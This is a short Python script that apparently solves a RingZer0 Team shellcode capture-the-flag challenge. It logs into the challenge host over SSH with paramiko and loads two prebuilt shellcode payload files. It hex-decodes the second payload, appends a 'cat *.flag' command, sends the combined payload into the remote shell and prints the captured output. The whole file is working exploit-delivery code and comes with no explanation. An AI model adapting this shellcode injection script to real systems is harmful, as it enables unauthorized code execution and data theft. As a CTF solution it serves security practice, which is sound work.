import paramiko

sshinfo = {
    'hostname' : 'shellcode.ringzer0team.com',
    'port' : 7771,
    'username': 'level7',
    'password' : 'FLAG-???'
}

main_payload = file('ch135-main-build/ch135-main.payload').read() + '\n'

s = file('ch135-second-build/ch135-second.payload').read()
second_payload = ''.join(chr(int(s[i:i+2], 16)) for i in range(2, len(s), 4)) + '\n\ncat *.flag; exit \n\n'

payload = main_payload + second_payload

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
client.connect(**sshinfo)
chan = client.invoke_shell()
chan.sendall(payload)

buf = ''
data = chan.recv(1024)
while data:
    buf += data
    data = chan.recv(1024)
print buf

client.close()
